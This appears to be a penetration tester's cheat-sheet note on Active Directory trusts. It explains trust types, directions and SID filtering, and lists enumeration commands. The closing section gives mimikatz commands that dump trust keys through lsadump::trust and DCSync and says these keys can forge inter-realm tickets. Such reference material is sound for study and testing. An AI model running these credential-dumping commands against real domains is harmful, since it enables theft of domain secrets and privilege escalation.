---
tags:
  - Active_Directory
  - Discovery
  - Foundational
  - Windows
---

## Active Directory Trust Theory
resources: [Microsoft AD Trusts](https://learn.microsoft.com/en-us/entra/identity/domain-services/concepts-forest-trust)

> [!info] Forests are security boundaries in AD. Trusts allow authentication across domains/forests.

### Trust Types
> - **Parent-Child** - Automatic two-way transitive trust within forest
> - **Tree-Root** - Trust between tree roots in same forest
> - **Forest** - Trust between different forests
> - **External** - Trust to specific domain in another forest
> - **Shortcut** - Optimization trust between domains in same forest

### Trust Directions
> - **One-way** - Users in trusted domain can access trusting domain
> - **Two-way** - Users in both domains can access each other
> - **Transitive** - Trust extends through chain of domains
> - **Non-transitive** - Trust limited to two specific domains

### SID Filtering
> [!important] Security mechanism that filters out SIDs from other domains. Prevents privilege escalation via SID history.

### When SID Filtering is Disabled
> [!warning] SID Filtering is disabled in these scenarios:
> - Intra-forest trusts (disabled by default)
> - When explicitly disabled on forest trust
> - Enables SID History attacks

### Enumerate Trusts [Remote]
```powershell
Get-ADTrust -Filter *
```

```powershell
Get-DomainTrust
```

```cmd
nltest /domain_trusts
```

### Enumerate Foreign Forest Trusts [Remote]
```powershell
Get-DomainTrust -Domain <TrustedForest>
```

```bash
ldapsearch -x -H ldap://<DC-IP> -D "<User>@<Domain>" -w "<Password>" -b "CN=System,DC=<Domain>,DC=<TLD>" "(objectClass=trustedDomain)"
```

## Forest Enumeration

### Enumerate Forest Domains [Remote]
```powershell
Get-ADForest | Select-Object -ExpandProperty Domains
```

```powershell
Get-ForestDomain
```

### Enumerate Global Catalogs [Remote]
```powershell
Get-ADForest | Select-Object -ExpandProperty GlobalCatalogs
```

### Enumerate External Trusts [Remote]
```powershell
Get-DomainTrust | Where-Object { $_.TrustType -eq "External" }
```

### Map All Trusts [Remote]
```powershell
Get-DomainTrustMapping
```

## Trust Keys

### Dump Trust Keys [Remote]
```cmd
mimikatz.exe
lsadump::trust /patch
```

### Trust Key Format
> [!info] Trust keys are shared secrets between trusted domains. Can be used to forge inter-realm tickets.

```cmd
mimikatz.exe
lsadump::dcsync /domain:<Domain> /user:<TrustedDomain>$
```
